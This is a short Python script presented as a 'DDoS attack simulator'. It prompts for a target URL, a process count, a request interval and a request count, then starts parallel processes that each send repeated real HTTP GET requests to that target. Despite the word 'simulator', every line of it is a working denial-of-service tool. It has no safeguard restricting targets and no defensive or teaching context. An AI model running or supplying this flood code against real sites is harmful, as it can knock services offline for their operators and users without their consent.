import requests
import time
from multiprocessing import Process
import sys

def send_requests(url, interval, num_requests):
    """Send HTTP requests to the specified URL at the specified interval."""
    for _ in range(num_requests):
        try:
            response = requests.get(url)
            print(f"Request sent to {url}. Status code: {response.status_code}")
        except Exception as e:
            print(f"Failed to send request to {url}: {e}")
        time.sleep(interval)

def run_attack(target_url, num_processes, request_interval, num_requests_per_process):
    """Run multiple processes to simulate a distributed attack."""
    processes = []
    for _ in range(num_processes):
        p = Process(target=send_requests, args=(target_url, request_interval, num_requests_per_process))
        p.start()
        processes.append(p)

    # Wait for all processes to finish
    for p in processes:
        p.join()

if __name__ == "__main__":
    if len(sys.argv) != 1:
        print("Usage: python script.py")
        sys.exit(1)

    print("Welcome to the DDoS attack simulator!")
    target_url = input("Enter the target URL: ")
    num_processes = int(input("Enter the number of processes: "))
    request_interval = float(input("Enter the request interval (in seconds): "))
    num_requests_per_process = int(input("Enter the number of requests per process: "))

    print(f"Simulating DDoS attack on {target_url} using {num_processes} processes...")
    run_attack(target_url, num_processes, request_interval, num_requests_per_process)
